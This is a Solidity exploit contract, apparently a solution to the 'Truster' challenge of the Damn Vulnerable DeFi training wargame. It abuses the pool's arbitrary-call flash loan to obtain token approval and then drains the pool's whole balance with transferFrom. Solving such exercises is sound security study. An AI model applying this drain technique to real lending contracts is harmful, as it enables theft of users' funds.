// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {TrusterLenderPool} from "./TrusterLenderPool.sol";

contract AttackerThruster {
    DamnValuableToken public token;
    TrusterLenderPool public pool;

    constructor(address tokenAddress, address poolAddress) {
        token = DamnValuableToken(tokenAddress);
        pool = TrusterLenderPool(poolAddress);
    }

    function exploit(address recovery) public {
        // No need to borrow anything, so we won't have to send back, balanceOf will not change
        uint256 amount = 0;
        // Player address
        address borrower = address(msg.sender);
        // Token address
        address target = address(token);
        // Encoding as Bytes of the function to call on the token address
        bytes memory data = abi.encodeCall(token.approve, (address(this), token.balanceOf(address(pool))));
        // Calling flashLoan on the pool contract
        pool.flashLoan(amount, borrower, target, data);
        // Final transfer to the recovery address as we have the allowance to do so
        token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
    }
}
